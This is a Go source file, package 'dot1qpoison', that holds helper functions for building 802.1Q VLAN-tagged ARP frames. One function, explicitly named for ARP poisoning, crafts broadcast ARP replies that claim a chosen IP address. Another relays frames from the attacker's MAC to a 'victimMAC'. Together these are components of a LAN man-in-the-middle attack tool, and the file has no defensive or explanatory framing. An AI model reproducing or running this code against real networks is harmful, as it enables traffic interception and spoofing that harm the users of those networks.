package dot1qpoison

import (
	"encoding/binary"
	"fmt"
	"net"
)

const (
	ethTypeVLAN = 0x8100
	ethTypeIPv4 = 0x0800
	ethTypeARP  = 0x0806
	arpOpRequest = 1
	arpOpReply   = 2
)

var broadcastMAC = [6]byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
var zeroMAC = [6]byte{0, 0, 0, 0, 0, 0}

func buildTaggedARP(vlan int, srcMAC, dstMAC net.HardwareAddr, opcode uint16,
	senderMAC net.HardwareAddr, senderIP, targetIP net.IP, targetHW net.HardwareAddr) []byte {

	const priority = 7
	tci := uint16(priority<<13 | (uint16(vlan) & 0xfff))

	arp := make([]byte, 28)
	binary.BigEndian.PutUint16(arp[0:2], 1)
	binary.BigEndian.PutUint16(arp[2:4], ethTypeARP)
	arp[4] = 6
	arp[5] = 4
	binary.BigEndian.PutUint16(arp[6:8], opcode)
	copy(arp[8:14], senderMAC)
	copy(arp[14:18], senderIP.To4())
	copy(arp[18:24], targetHW)
	copy(arp[24:28], targetIP.To4())

	frame := make([]byte, 14+4+len(arp))
	copy(frame[0:6], dstMAC)
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], ethTypeVLAN)
	binary.BigEndian.PutUint16(frame[14:16], tci)
	binary.BigEndian.PutUint16(frame[16:18], ethTypeARP)
	copy(frame[18:], arp)
	return frame
}

func buildARPRequest(srcMAC net.HardwareAddr, srcIP, dstIP net.IP, vlan int) []byte {
	return buildTaggedARP(vlan, srcMAC, broadcastMAC[:], arpOpRequest,
		srcMAC, srcIP, dstIP, zeroMAC[:])
}

func buildARPPoisonReply(srcMAC net.HardwareAddr, poisonIP net.IP, vlan int) []byte {
	return buildTaggedARP(vlan, srcMAC, broadcastMAC[:], arpOpReply,
		srcMAC, poisonIP, net.IPv4zero, broadcastMAC[:])
}

func buildRelayFrame(ourMAC, victimMAC net.HardwareAddr, vlanPayload []byte) []byte {
	frame := make([]byte, 14+len(vlanPayload))
	copy(frame[0:6], victimMAC)
	copy(frame[6:12], ourMAC)
	frame[12] = 0x81
	frame[13] = 0x00
	copy(frame[14:], vlanPayload)
	return frame
}

func formatMAC(mac []byte) string {
	if len(mac) != 6 {
		return "unknown"
	}
	return fmt.Sprintf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5])
}

func macEqual(a, b net.HardwareAddr) bool {
	if len(a) != 6 || len(b) != 6 {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
